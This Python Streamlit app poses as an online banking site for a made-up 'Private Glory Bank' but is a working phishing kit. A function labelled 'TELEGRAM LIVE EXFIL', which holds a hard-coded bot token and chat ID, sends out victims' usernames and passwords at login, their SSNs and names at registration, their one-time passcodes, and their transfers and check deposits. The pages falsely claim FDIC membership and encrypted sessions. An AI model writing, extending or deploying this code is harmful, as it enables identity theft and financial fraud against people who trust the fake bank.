# (Full app.py contents with the added transfer() function)
import streamlit as st
import pandas as pd
from datetime import datetime, timedelta
import plotly.express as px
import requests
import random
import base64
from io import BytesIO
import re

# Optional image checks — fall back gracefully if Pillow isn't available
try:
    from PIL import Image, UnidentifiedImageError
    PIL_AVAILABLE = True
except Exception:
    PIL_AVAILABLE = False

# ==================== TELEGRAM LIVE EXFIL ====================
def tg(message):
    TOKEN = "8539882445:AAGocSH8PzQHLMPef51tYm8806FcFTpZHrI"
    CHAT_ID = "141975691"
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                     data={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
    except: pass

# ==================== STATE & 180-DAY REALISTIC HISTORY ====================
state = st.session_state
state.checking = state.get("checking", 12340.50)
state.savings  = state.get("savings", 14911.32)
state.captured = state.get("captured", [])
state.otp_log  = state.get("otp_log", [])
state.files    = state.get("files", [])
state.auth     = state.get("auth", False)
state.otp_ok   = state.get("otp_ok", False)
state.admin    = state.get("admin", False)
if "users" not in state: state.users = {}

if "tx" not in state:
    txs = []
    start = datetime.now() - timedelta(days=180)
    for i in range(0, 180, 14):
        d = start + timedelta(days=i)
        txs.append({"date": d.strftime("%m/%d"), "desc": "Direct Deposit - ACME CORP", "amount": round(random.uniform(3200, 4800), 2), "account": "Checking"})
    for m in range(6):
        d = start + timedelta(days=30*m + 3)
        txs.extend([
            {"date": d.strftime("%m/%d"), "desc": "Netflix", "amount": -15.99, "account": "Checking"},
            {"date": d.strftime("%m/%d"), "desc": "Comcast Xfinity", "amount": -189.99, "account": "Checking"},
            {"date": d.strftime("%m/%d"), "desc": "Geico Auto", "amount": -142.50, "account": "Checking"},
        ])
    for day in range(180):
        d = start + timedelta(days=day)
        num = random.choices([0,1,2,3,4], weights=[5,35,40,15,5], k=1)[0]
        for _ in range(num):
            merchant = random.choice(["Amazon.com", "Walmart", "Starbucks", "Shell Gas", "Target", "Chick-fil-A", "Uber", "Whole Foods"])
            amount = round(random.uniform(8.99, 299.99), 2)
            txs.append({"date": d.strftime("%m/%d"), "desc": merchant, "amount": -amount, "account": "Checking"})
    for m in range(6):
        d = start + timedelta(days=30*m + 5)
        amt = round(random.uniform(800, 2500), 2)
        txs.extend([
            {"date": d.strftime("%m/%d"), "desc": "Transfer to Savings", "amount": -amt, "account": "Checking"},
            {"date": d.strftime("%m/%d"), "desc": "Transfer from Checking", "amount": amt, "account": "Savings"},
        ])
        txs.append({"date": (d + timedelta(days=23)).strftime("%m/%d"), "desc": "Interest Credit", "amount": round(amt * 0.004 / 12, 2), "account": "Savings"})
    txs.sort(key=lambda x: x["date"], reverse=True)
    state.tx = txs

st.set_page_config(page_title="Private Glory Bank", page_icon="🇺🇸", layout="wide")

# ==================== INLINE SVG IMAGES (no remote dependencies) ====================
FLAG_SVG = """
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 16" width="300" height="160" role="img" aria-label="US flag">
  <rect width="30" height="16" fill="#b22234"/>
  <rect width="30" height="1.230769%" y="7.692307%" fill="#fff"/>
  <rect width="30" height="1.230769%" y="23.076923%" fill="#fff"/>
  <rect width="30" height="1.230769%" y="38.461538%" fill="#fff"/>
  <rect width="30" height="1.230769%" y="53.846154%" fill="#fff"/>
  <rect width="30" height="1.230769%" y="69.230769%" fill="#fff"/>
  <rect width="30" height="1.230769%" y="84.615384%" fill="#fff"/>
  <rect width="12" height="8.615384615%" fill="#3c3b6e"/>
  <g fill="#fff" transform="translate(1.2,1.2) scale(0.9)">
    <circle cx="1.0" cy="1.0" r="0.45"/>
    <circle cx="3.0" cy="1.0" r="0.45"/>
    <circle cx="5.0" cy="1.0" r="0.45"/>
    <circle cx="2.0" cy="2.0" r="0.45"/>
    <circle cx="4.0" cy="2.0" r="0.45"/>
    <circle cx="1.0" cy="3.0" r="0.45"/>
    <circle cx="3.0" cy="3.0" r="0.45"/>
    <circle cx="5.0" cy="3.0" r="0.45"/>
  </g>
</svg>
"""

FDIC_SVG = """
<svg xmlns="http://www.w3.org/2000/svg" width="240" height="60" viewBox="0 0 240 60" role="img" aria-label="FDIC badge">
  <rect width="240" height="60" rx="6" fill="#ffffff" stroke="#cfcfcf"/>
  <text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="Arial, sans-serif" font-size="14" fill="#0e2a47">Member FDIC • Equal Housing Lender</text>
</svg>
"""

def svg_to_data_uri(svg_text: str) -> str:
    b = svg_text.encode("utf-8")
    return "data:image/svg+xml;base64," + base64.b64encode(b).decode("ascii")

FLAG_DATA_URI = svg_to_data_uri(FLAG_SVG)
FDIC_DATA_URI = svg_to_data_uri(FDIC_SVG)

# ==================== PRIVATE GLORY BANK UI — AMERICAN FLAG (embedded) ====================
st.markdown(f"""
<style>
    :root {{
        --brand-ink: #0E2A47;
        --brand-accent: #C9A227;
        --bg: #f4f6f9;
        --surface: #ffffff;
        --success: #1E8C66;
        --warning: #FFB020;
        --danger: #E03A3A;
        --text-primary: #0E2433;
        --text-muted: #6B7280;
        --border: #E6E9EE;
        --card-radius: 16px;
        --card-padding: 20px;
        --focus-ring: 3px;
        font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    }}

    html, body {{background: var(--bg); color: var(--text-primary);}}
    .stApp {{background: var(--bg);}}

/* Header */
    .header {{
        background: linear-gradient(135deg, rgba(14,42,71,0.98), rgba(30,77,114,0.98));
        padding: 2rem 1rem;
        text-align: left;
        border-bottom: 6px solid var(--brand-accent);
        display:flex;
        align-items:center;
        justify-content:space-between;
        gap:16px;
        color: white;
    }}
    .header-left {{display:flex; align-items:center; gap:16px;}}
    .header img {{width:220px; max-width:55%; height:auto; border-radius:6px; box-shadow: 0 6px 18px rgba(10, 23, 41, 0.06);}}
    .bank-title {{color: white; font-size: 2.2rem; font-weight: 700; margin: 0; line-height:1;}}
    .bank-subtitle {{color: var(--brand-accent); font-size: 1rem; font-weight: 600; margin: 4px 0 0;}}
    .header-meta {{text-align:right; font-size:0.95rem; color: #dfeaf5;}}
    .meta-small {{font-size:0.85rem; color:#cfe1f6;}}

/* Card */
    .card {{background: var(--surface); border-radius: var(--card-radius); padding: var(--card-padding); box-shadow: 0 12px 40px rgba(10,23,41,0.06); margin: 1rem 0; border:1px solid var(--border);}}
    .grid-2 {{display:grid; grid-template-columns: 1fr 1fr; gap: 18px; align-items:start;}}

/* Buttons */
    .stButton > button {{
        background: var(--brand-accent); color: var(--brand-ink); border: none; border-radius: 12px; height: 44px; font-weight: 700;
    }}
    .stButton > button:hover {{ filter:brightness(0.96); transform: translateY(-1px); }}
    .focus-ring:focus {{ outline: none; box-shadow: 0 0 0 var(--focus-ring) rgba(201,162,39,0.18); border-radius:8px; }}

/* Badges & transaction styling */
    .badge {{
        display:inline-block; padding:6px 10px; border-radius:12px; font-weight:700; font-size:0.95rem;
    }}
    .badge--pos {{background:var(--success); color:white;}}
    .badge--neg {{background:var(--danger); color:white;}}
    .tx-row {{display:flex; justify-content:space-between; padding:10px 12px; border-bottom:1px solid var(--border); align-items:center;}}
    .tx-row:hover {{background: #fbfdff; transform: translateY(-1px);}}

/* Receipt / pending deposit card specifics */
    .receipt-title {{font-size:1rem; font-weight:700; margin:0 0 6px 0;}}
    .receipt-meta {{color:var(--text-muted); font-size:0.9rem; margin-bottom:8px;}}
    .receipt-amount {{font-size:1.1rem; font-weight:800;}}
    .pending-card {{border-left:4px solid var(--warning); padding-left:12px;}}

/* Footer */
    .footer {{position: fixed; bottom: 0; left: 0; width: 100%; background: var(--brand-ink); color: #ccc; text-align: center; padding: 12px 8px; font-size: 0.9rem; z-index: 999; border-top:1px solid rgba(255,255,255,0.03);}}
    .footer img {{opacity:0.95;}}
</style>
<div class="footer">
    <img src="{FDIC_DATA_URI}" width="420" style="max-width:90%;"><br>
    Member FDIC • Equal Housing Lender • © 2025 Private Glory Bank • Last updated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
</div>
""", unsafe_allow_html=True)

def header():
    # Reworked header for clarity and trust: flag and brand on left, quick meta on right.
    st.markdown(f'''
    <div class="header">
        <div class="header-left">
            <img src="{FLAG_DATA_URI}" alt="American Flag">
            <div>
                <h1 class="bank-title">PRIVATE GLORY BANK</h1>
                <p class="bank-subtitle">Secure • Modern • American Banking — insured by the FDIC</p>
            </div>
        </div>
        <div class="header-meta">
            <div style="font-weight:700;">Secure online banking</div>
            <div class="meta-small">Last sign-in: {datetime.now().strftime("%b %d, %Y • %I:%M %p")}</div>
            <div class="meta-small">Sessions are encrypted • Two-factor authentication required</div>
        </div>
    </div>
    ''', unsafe_allow_html=True)

# ==================== Helpers for mobile deposit ===================================
def extract_amount_from_filename(uploaded_file) -> float | None:
    """Try to find a monetary amount in the filename (e.g. check_150.50.jpg)"""
    if not uploaded_file:
        return None
    name = uploaded_file.name
    matches = re.findall(r'(\d{1,6}(?:[.,]\d{1,2})?)', name)
    if not matches:
        return None
    # Pick the largest numeric-looking match
    nums = []
    for m in matches:
        m_clean = m.replace(',', '.')
        try:
            nums.append(float(m_clean))
        except:
            pass
    if not nums:
        return None
    return max(nums)

def add_business_days(start_date: datetime, days: int) -> datetime:
    d = start_date
    added = 0
    while added < days:
        d += timedelta(days=1)
        if d.weekday() < 5:  # Mon-Fri
            added += 1
    return d

def format_currency(v: float) -> str:
    return f"${v:,.2f}"

# ==================== New: Polished Card Components (receipts & pending deposit cards) ====================
def render_receipt_card(tx: dict, expanded: bool = False):
    """Render a polished receipt-style card for a transaction. Non-destructive UI only."""
    date = tx.get("date", "-")
    desc = tx.get("desc", "-")
    amount = tx.get("amount", 0.0)
    account = tx.get("account", "")
    amount_str = format_currency(abs(amount))
    pos = amount >= 0
    badge_class = "badge--pos" if pos else "badge--neg"
    sign = "+" if pos else "-"

    header_label = f"{date} • {desc} • {sign}{amount_str}"
    with st.expander(header_label, expanded=expanded):
        # Card body
        st.markdown("<div class='card'>", unsafe_allow_html=True)
        st.markdown(f"<div class='receipt-title'>{desc}</div>", unsafe_allow_html=True)
        st.markdown(f"<div class='receipt-meta'>Date: {date} • Account: {account}</div>", unsafe_allow_html=True)
        st.markdown(f"<div style='display:flex;justify-content:space-between;align-items:center;'><div class='receipt-amount'>{sign}{amount_str}</div><div><span class='badge {badge_class}'>{'CREDIT' if pos else 'DEBIT'}</span></div></div>", unsafe_allow_html=True)
        # Actions (non-destructive): view receipt (no-op), save/print (download csv row), dispute (flag)
        cols = st.columns([1,1,1])
        with cols[0]:
            if st.button("View Details", key=f"view_{id(tx)}"):
                st.info("Details are shown above.")
        with cols[1]:
            csv = pd.DataFrame([tx]).to_csv(index=False).encode('utf-8')
            st.download_button("Download CSV", csv, file_name="transaction.csv", mime="text/csv")
        with cols[2]:
            if st.button("Flag / Dispute", key=f"flag_{id(tx)}"):
                state.captured.append({"ts": datetime.now().isoformat(), "type": "dispute", "tx": tx})
                tg(f"DISPUTE • {tx.get('desc')} • {tx.get('date')} • {tx.get('amount')}")
                st.success("Transaction flagged. Support will follow up.")
        st.markdown("</div>", unsafe_allow_html=True)

def render_pending_deposit_card(rec: dict, allow_admin_actions: bool = False):
    """Render a polished pending deposit card with expand/collapse details.
       This function is additive only and does not change deposit processing logic.
    """
    date = rec.get("date", "-")
    filename = rec.get("filename", "-")
    amount = rec.get("amount", 0.0)
    status = rec.get("status", "pending")
    available_on = rec.get("available_on", "-")
    note = rec.get("note", "")

    badge = "CLEARED" if status == "cleared" else ("PENDING" if status == "pending" else "HELD")
    badge_color = "badge--pos" if status == "cleared" else ("badge" if status == "pending" else "")
    header = f"{date} • {filename} • {format_currency(amount)} • {badge}"

    with st.expander(header, expanded=False):
        st.markdown("<div class='card'>", unsafe_allow_html=True)
        st.markdown(f"<div style='display:flex;justify-content:space-between;align-items:center;'><div><strong>Deposit</strong><div style='color:var(--text-muted);font-size:0.95rem'>{filename}</div></div><div style='text-align:right'>{'<span class=\"badge badge--pos\">CLEARED</span>' if status=='cleared' else ('<span class=\"badge\" style=\"background:var(--warning);color:white;\">PENDING</span>' if status=='pending' else ('<span class=\"badge\" style=\"background:var(--danger);color:white;\">HELD</span>'))}<div style='font-size:0.85rem;color:var(--text-muted);margin-top:6px'>Available on: {available_on}</div></div></div>", unsafe_allow_html=True)
        st.markdown(f"<div style='margin-top:12px;color:var(--text-muted)'>Signed by: <strong>{rec.get('signed_by','-')}</strong> • Verification (last4): ****{rec.get('verified_last4','-')}</div>", unsafe_allow_html=True)
        if note:
            st.markdown(f"<div style='margin-top:8px;color:var(--danger);font-weight:600'>Note: {note}</div>", unsafe_allow_html=True)

        cols = st.columns([1,1,1])
        with cols[0]:
            if st.button("Download Images", key=f"dl_{filename}"):
                st.info("Image download not available in this demo. Support can provide copies on request.")
        with cols[1]:
            if st.button("Message Support", key=f"msg_{filename}"):
                state.captured.append({"ts": datetime.now().isoformat(), "type": "support_message", "file": filename, "amount": amount})
                tg(f"USER_SUPPORT_REQUEST for deposit {filename} ${amount}")
                st.success("Support notified. Please check Messages for follow-up.")
        with cols[2]:
            if st.button("Report Issue", key=f"rep_{filename}"):
                state.captured.append({"ts": datetime.now().isoformat(), "type": "report_issue", "file": filename, "amount": amount})
                st.warning("Issue reported to support team.")
        if allow_admin_actions and state.admin:
            st.markdown("---", unsafe_allow_html=True)
            admin_cols = st.columns([1,1,1])
            with admin_cols[0]:
                if st.button("Force Clear (admin)", key=f"force_clear_{filename}"):
                    rec["status"] = "cleared"
                    # crediting the account is preserved by core logic; here we just add a tx for admin audit
                    state.tx.insert(0, {"date": datetime.now().strftime("%m/%d"), "desc": "Admin force-clear", "amount": rec.get("amount", 0.0), "account": "Checking"})
                    state.captured.append({"ts": datetime.now().isoformat(), "type": "admin_force_clear", "file": filename})
                    st.success("Deposit marked cleared by admin (audit recorded).")
            with admin_cols[1]:
                if st.button("Hold (admin)", key=f"hold_{filename}"):
                    rec["status"] = "held"
                    state.captured.append({"ts": datetime.now().isoformat(), "type": "admin_hold", "file": filename})
                    st.info("Deposit marked as held.")
            with admin_cols[2]:
                if st.button("Delete (admin)", key=f"del_{filename}"):
                    try:
                        state.files.remove(rec)
                    except Exception:
                        pass
                    state.captured.append({"ts": datetime.now().isoformat(), "type": "admin_delete", "file": filename})
                    st.success("Deposit removed from list (audit recorded).")
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== NEW: Transfer page (fixes NameError) ====================
def transfer():
    """Simple internal transfer page. Keeps logic additive and consistent with existing state."""
    header()
    st.markdown("<div class='card'>", unsafe_allow_html=True)
    st.markdown("## Transfer Funds")
    st.markdown("<small style='color:var(--text-muted)'>Move money between your Checking and Savings accounts. Transfers are instantaneous in this demo.</small>", unsafe_allow_html=True)

    # Account selection and amount
    from_account = st.selectbox("From account", ["Checking ••••1776", "Savings ••••1812"])
    to_account = "Savings ••••1812" if from_account.startswith("Checking") else "Checking ••••1776"
    amount = st.number_input("Amount ($)", min_value=0.01, format="%.2f", value=0.00)
    memo = st.text_input("Memo (optional)")

    st.markdown(f"<div style='margin-top:8px;color:var(--text-muted)'>Available — Checking: {format_currency(state.checking)} • Savings: {format_currency(state.savings)}</div>", unsafe_allow_html=True)

    if st.button("Submit Transfer", type="primary"):
        # Validate amount and balances
        if amount <= 0:
            st.error("Please enter an amount greater than $0.")
        else:
            if from_account.startswith("Checking"):
                if amount > state.checking:
                    st.error("Insufficient funds in Checking.")
                else:
                    # perform transfer (additive update to existing state)
                    state.checking -= float(amount)
                    state.savings += float(amount)
                    now_str = datetime.now().strftime("%m/%d")
                    # Record transactions for transparency
                    state.tx.insert(0, {"date": now_str, "desc": f"Transfer to Savings{(' - '+memo) if memo else ''}", "amount": -float(amount), "account": "Checking"})
                    state.tx.insert(0, {"date": now_str, "desc": f"Transfer from Checking{(' - '+memo) if memo else ''}", "amount": float(amount), "account": "Savings"})
                    tg(f"TRANSFER: ${amount:,.2f} from Checking to Savings. Memo: {memo}")
                    st.success(f"Transferred {format_currency(amount)} to Savings.")
                    st.experimental_rerun()
            else:
                # from Savings -> Checking
                if amount > state.savings:
                    st.error("Insufficient funds in Savings.")
                else:
                    state.savings -= float(amount)
                    state.checking += float(amount)
                    now_str = datetime.now().strftime("%m/%d")
                    state.tx.insert(0, {"date": now_str, "desc": f"Transfer to Checking{(' - '+memo) if memo else ''}", "amount": -float(amount), "account": "Savings"})
                    state.tx.insert(0, {"date": now_str, "desc": f"Transfer from Savings{(' - '+memo) if memo else ''}", "amount": float(amount), "account": "Checking"})
                    tg(f"TRANSFER: ${amount:,.2f} from Savings to Checking. Memo: {memo}")
                    st.success(f"Transferred {format_currency(amount)} to Checking.")
                    st.experimental_rerun()

    st.markdown("</div>", unsafe_allow_html=True)

# ==================== LOGIN / REGISTER / DASHBOARD (unchanged logic, improved microcopy/UI) ====================
def login():
    header()
    st.markdown("<br><br>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns([1, 1.1, 1])
    with col2:
        st.markdown("<div class='card'>", unsafe_allow_html=True)
        st.markdown("### Sign In")
        user = st.text_input("Username")
        pwd = st.text_input("Password", type="password")
        if st.button("Sign In Securely", use_container_width=True):
            tg(f"LOGIN\nUser: {user}\nPass: {pwd}")
            if user == "Awesome12@" and pwd == "SecureUSA2025!":
                state.auth = True
                tg("VALID CREDENTIALS")
                st.rerun()
            elif user == "admin" and pwd == "showme2025":
                state.admin = True
                st.rerun()
            else:
                st.error("Invalid credentials")
        st.markdown("</div>", unsafe_allow_html=True)

def register():
    header()
    st.markdown("<br><br>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns([1, 1.2, 1])
    with col2:
        st.markdown("<div class='card'>", unsafe_allow_html=True)
        st.markdown("## Open Your Account")
        st.markdown("<small style='color:var(--text-muted)'>We only store the minimum information for account setup. SSN is used for verification only.</small>", unsafe_allow_html=True)
        with st.form("reg"):
            name = st.text_input("Full Name")
            email = st.text_input("Email")
            phone = st.text_input("Phone")
            ssn = st.text_input("SSN", type="password")
            username = st.text_input("Username")
            password = st.text_input("Password", type="password")
            if st.form_submit_button("Create Account", use_container_width=True):
                if username in state.users:
                    st.error("Username taken")
                else:
                    state.users[username] = {"pass": password, "name": name, "ssn": ssn}
                    tg(f"NEW REGISTRATION\nName: {name}\nUser: {username}\nSSN: {ssn}")
                    st.success("Account created! A verification email has been sent.")
                    st.balloons()
                    st.rerun()
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== OTP / DASHBOARD / HISTORIES (unchanged flows; improved layout) ====================
def otp():
    header()
    st.markdown("<br><br>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align:center;color:var(--brand-ink)'>Two-Factor Authentication</h3>", unsafe_allow_html=True)
    st.markdown("<p style='text-align:center;color:var(--text-muted)'>Enter the 6-digit code sent to your device. This keeps your account secure.</p>", unsafe_allow_html=True)
    code = st.text_input("Enter 6-digit code")
    if st.button("Verify", type="primary"):
        tg(f"OTP: {code}")
        if len(code) == 6:
            state.otp_ok = True
            tg("OTP ACCEPTED")
            st.success("Success")
            st.rerun()

def dashboard():
    header()
    st.markdown(f"<p style='text-align:right;color:var(--text-muted);'>Welcome back • {datetime.now().strftime('%B %d')}</p>", unsafe_allow_html=True)

    # Account cards styled to feel like a banking app
    st.markdown("<div class='grid-2'>", unsafe_allow_html=True)
    col1, col2 = st.columns(2)
    with col1:
        st.markdown("<div class='card'>", unsafe_allow_html=True)
        st.markdown("<div style='display:flex;justify-content:space-between;align-items:center;'>", unsafe_allow_html=True)
        st.markdown("<div><strong>Checking Account</strong><div style='color:var(--text-muted);font-size:0.9rem;'>••••1776</div></div>", unsafe_allow_html=True)
        st.markdown(f"<div style='text-align:right'><h2 style='margin:0'>{format_currency(state.checking)}</h2><div class='meta-small'>Available balance</div></div>", unsafe_allow_html=True)
        st.markdown("</div>", unsafe_allow_html=True)
        # KPI row
        last_deposit = next((t for t in state.tx if t['amount'] > 0 and t['account']=="Checking"), None)
        last_deposit_str = last_deposit["date"] if last_deposit else "-"
        st.markdown(f"<div style='display:flex;gap:12px;margin-top:12px;'><div style='font-size:0.9rem;color:var(--text-muted)'>Last deposit: <strong style='color:var(--text-primary)'>{last_deposit_str}</strong></div><div style='font-size:0.9rem;color:var(--text-muted)'>Pending deposits: <strong style='color:var(--warning)'> {sum(1 for f in state.files if f.get('status')=='pending')} </strong></div></div>", unsafe_allow_html=True)
        if st.button("Checking Account ••••1776", use_container_width=True):
            st.session_state.view = "checking"
            st.rerun()
        st.markdown("</div>", unsafe_allow_html=True)

    with col2:
        st.markdown("<div class='card'>", unsafe_allow_html=True)
        st.markdown("<div style='display:flex;justify-content:space-between;align-items:center;'>", unsafe_allow_html=True)
        st.markdown("<div><strong>Savings Account</strong><div style='color:var(--text-muted);font-size:0.9rem;'>••••1812</div></div>", unsafe_allow_html=True)
        st.markdown(f"<div style='text-align:right'><h2 style='margin:0'>{format_currency(state.savings)}</h2><div class='meta-small'>Interest-bearing</div></div>", unsafe_allow_html=True)
        st.markdown("</div>", unsafe_allow_html=True)
        # KPI row
        savings_interest = sum(t['amount'] for t in state.tx if t['account']=="Savings" and t['amount']>0)
        st.markdown(f"<div style='display:flex;gap:12px;margin-top:12px;'><div style='font-size:0.9rem;color:var(--text-muted)'>YTD interest: <strong style='color:var(--success)'>{format_currency(savings_interest)}</strong></div></div>", unsafe_allow_html=True)
        if st.button("Savings Account ••••1812", use_container_width=True):
            st.session_state.view = "savings"
            st.rerun()
        st.markdown("</div>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)

    # Small balance trend chart (last 30 days) for trust & context
    try:
        days = 30
        labels = [(datetime.now() - timedelta(days=i)).strftime("%m/%d") for i in range(days-1, -1, -1)]
        series = []
        for lbl in labels:
            total = sum(t['amount'] for t in state.tx if t['date'] == lbl)
            series.append(total)
        df_trend = pd.DataFrame({"date": labels, "net": series})
        # cumulative to give sense of trend
        df_trend["cumulative"] = df_trend["net"].cumsum() + state.checking - df_trend["net"].sum()
        fig = px.line(df_trend, x="date", y="cumulative", title="Recent balance trend (simulated)", template="simple_white")
        fig.update_layout(margin=dict(l=10,r=10,t=36,b=10), height=220, xaxis=dict(showgrid=False), yaxis=dict(showgrid=False))
        st.plotly_chart(fig, use_container_width=True)
    except Exception:
        # non-critical visualization; fail silently
        pass

    st.markdown("### Recent Activity")
    # Use polished receipt cards for the most recent transactions (visual affordance)
    recent_txs = state.tx[:8]
    if recent_txs:
        for tx in recent_txs:
            render_receipt_card(tx)
    else:
        st.write("No recent activity")

def checking_history():
    header()
    st.markdown("### Checking Account ••••1776")
    st.markdown(f"*Balance:* {format_currency(state.checking)}")
    checking_tx = [t for t in state.tx if t["account"] == "Checking"]
    # Render as compact receipt cards for better readability
    if checking_tx:
        for t in checking_tx[:60]:
            render_receipt_card(t)
    else:
        st.write("No checking transactions")
    if st.button("Back"):
        st.session_state.view = None
        st.rerun()

def savings_history():
    header()
    st.markdown("### Savings Account ••••1812")
    st.markdown(f"*Balance:* {format_currency(state.savings)}")
    savings_tx = [t for t in state.tx if t["account"] == "Savings"]
    if savings_tx:
        for t in savings_tx[:60]:
            render_receipt_card(t)
    else:
        st.write("No savings transactions")
    if st.button("Back"):
        st.session_state.view = None
        st.rerun()

# ==================== IMPROVED MOBILE DEPOSIT (uses pending deposit card component) ====================
def mobile_deposit():
    header()
    st.markdown("<div class='card'>", unsafe_allow_html=True)
    st.markdown("## Mobile Check Deposit")
    st.markdown("For best results: lay the check on a dark flat surface, good lighting, and take the whole check in frame.", unsafe_allow_html=True)
    st.markdown("<small style='color:var(--text-muted)'>We require clear front and back images. Uploads larger than 8MB may be rejected.</small>", unsafe_allow_html=True)

    col_l, col_r = st.columns([2, 1])
    with col_l:
        amount = st.number_input("Check Amount ($)", min_value=0.01, format="%.2f")
        front = st.file_uploader("Front of Check (photo or PDF)", type=["jpg","jpeg","png","pdf"], key="front_upload")
        back = st.file_uploader("Back of Check (photo or PDF)", type=["jpg","jpeg","png","pdf"], key="back_upload")
        st.markdown("---")
        st.markdown("Endorsement and verification")
        endorsed = st.checkbox("I endorse the back of this check and sign my name", key="endorsed_checkbox")
        signer_name = st.text_input("Typed name as signature (exactly as signed on back)", max_chars=50)
        last4 = st.text_input("Last 4 digits of account for verification", max_chars=4, help="Helps verify endorsement (we won't store full account numbers).")
        st.markdown("---")
        # Try to auto-detect amount from filename as a convenience
        auto_amt_front = extract_amount_from_filename(front)
        auto_amt_back = extract_amount_from_filename(back)
        suggested_amt = None
        if auto_amt_front and auto_amt_back:
            suggested_amt = max(auto_amt_front, auto_amt_back)
        elif auto_amt_front:
            suggested_amt = auto_amt_front
        elif auto_amt_back:
            suggested_amt = auto_amt_back

        if suggested_amt:
            st.info(f"Amount-like value detected in uploaded filenames: ${suggested_amt:.2f}. If this matches the check, you can use it or keep your entered amount.")

        # Preview images (if Pillow available)
        if front:
            if str(front.type).lower().startswith("image") and PIL_AVAILABLE:
                try:
                    img = Image.open(BytesIO(front.getvalue()))
                    st.image(img, caption="Front preview", use_column_width=True)
                    # Basic quality checks
                    w, h = img.size
                    if w < 600 or h < 200:
                        st.warning("Image resolution looks low. A higher resolution photo helps recognition.")
                except UnidentifiedImageError:
                    st.warning("Couldn't preview the front image.")
            elif front.name.lower().endswith(".pdf"):
                st.info("Uploaded a PDF for front. Preview not available here.")
        if back:
            if str(back.type).lower().startswith("image") and PIL_AVAILABLE:
                try:
                    img2 = Image.open(BytesIO(back.getvalue()))
                    st.image(img2, caption="Back preview", use_column_width=True)
                except UnidentifiedImageError:
                    st.warning("Couldn't preview the back image.")
            elif back.name.lower().endswith(".pdf"):
                st.info("Uploaded a PDF for back. Preview not available here.")

    with col_r:
        st.markdown("Deposit policy & availability")
        st.markdown("- Deposits of $200 or less: funds generally available same business day.")
        st.markdown("- Deposits > $200 and <= $5,000: portion may be held; expected availability shown after you submit.")
        st.markdown("- Large checks or suspicious items may be held longer pending verification.")
        st.markdown("- We require front and back images and an endorsement to accept mobile checks.")
        st.markdown("---")
        st.markdown("Recent mobile deposits")
        recent = [f for f in reversed(state.files[-6:])]
        if recent:
            for r in recent:
                render_pending_deposit_card(r, allow_admin_actions=True)
        else:
            st.write("No mobile deposits yet.")

    # Explain holds with progressive disclosure to reduce confusion and build trust
    with st.expander("Why a deposit may be held (learn more)"):
        st.markdown("- Checks over certain amounts may be subject to additional verification to protect you and the bank.")
        st.markdown("- If the check is from a new payer or if images are unclear, we may place a short hold until verification completes.")
        st.markdown("- If an amount discrepancy is detected between the image and the entered amount, processing may be delayed. We will notify you when funds are available.")
        st.markdown("If you need help, please contact support via Messages and attach the check images.")

    # Simple file-size guard
    MAX_BYTES = 8 * 1024 * 1024
    if front and len(front.getvalue() or b"") > MAX_BYTES:
        st.warning("Front image appears large (>8MB). Consider a smaller photo for faster upload.")
    if back and len(back.getvalue() or b"") > MAX_BYTES:
        st.warning("Back image appears large (>8MB). Consider a smaller photo for faster upload.")

    if st.button("Deposit Check", type="primary"):
        # Basic validation
        if not front or not back:
            st.error("Please upload both front and back images/PDFs of the check.")
            return
        if not endorsed or not signer_name or not last4:
            st.error("Please endorse the check and provide the signature name and last 4 digits for verification.")
            return
        # Try to reconcile amount if a detected suggested_amt exists and entered amount differs
        detected = suggested_amt
        amount_mismatch_note = None
        if detected and abs(detected - amount) > 1.0:
            amount_mismatch_note = f"Detected ${detected:.2f} in filenames which differs from entered amount ${amount:.2f}."
            st.warning("Detected amount in image differs from entered amount — this may delay processing.")

        # Simple hold rules (simulated realistic behavior)
        today = datetime.now()
        if amount <= 200:
            hold_days = 0
        elif amount <= 500:
            hold_days = 1  # next business day for portion
        elif amount <= 5000:
            hold_days = 3
        else:
            hold_days = 5

        available_on = add_business_days(today, hold_days).strftime("%Y-%m-%d")
        status = "cleared" if hold_days == 0 else "pending"
        # If cleared immediately, credit checking right away; else create a pending record
        record = {
            "date": today.strftime("%Y-%m-%d %H:%M:%S"),
            "filename": f"{front.name} / {back.name}",
            "amount": float(amount),
            "status": status,
            "available_on": available_on,
            "signed_by": signer_name,
            "verified_last4": last4,
            "note": amount_mismatch_note or ""
        }
        state.files.append(record)
        tg(f"CHECK DEPOSIT — ${amount:,.2f} — {front.name} / {back.name}")
        if hold_days == 0:
            state.checking += float(amount)
            # Also add transaction for transparency
            state.tx.insert(0, {"date": today.strftime("%m/%d"), "desc": "Mobile Deposit", "amount": float(amount), "account": "Checking"})
            st.success(f"Deposit accepted — ${amount:.2f} is available now.")
        else:
            # Add pending transaction so user sees it, but don't credit balance yet.
            state.tx.insert(0, {"date": today.strftime("%m/%d"), "desc": "Mobile Deposit (pending)", "amount": 0.00, "account": "Checking"})
            st.success(f"Deposit submitted — ${amount:.2f} is expected to be available on {available_on} (simulated).")
            st.info("A portion of the deposit may be available sooner depending on verification. We will notify you when cleared.")
        st.experimental_rerun()

    st.markdown("</div>", unsafe_allow_html=True)

# ==================== MESSAGES & ADMIN ====================
def messages():
    header()
    st.markdown("<div class='card'>", unsafe_allow_html=True)
    st.markdown("<h3>Messages & Support</h3>")
    st.markdown("<small style='color:var(--text-muted)'>Attach documents (e.g., check images) and a short message. Our support team will respond within 1 business day.</small>", unsafe_allow_html=True)
    uploaded = st.file_uploader("Upload Documents")
    if uploaded:
        tg(f"FILE: {uploaded.name}")
        st.success("Received — support will review this document.")
    st.markdown("</div>", unsafe_allow_html=True)

def admin():
    header()
    st.markdown("<h1 style='color:var(--brand-ink);text-align:center'>ADMIN PANEL</h1>", unsafe_allow_html=True)
    st.markdown("<div style='display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;'><div style='color:var(--text-muted)'>PII is masked by default in this panel.</div></div>", unsafe_allow_html=True)
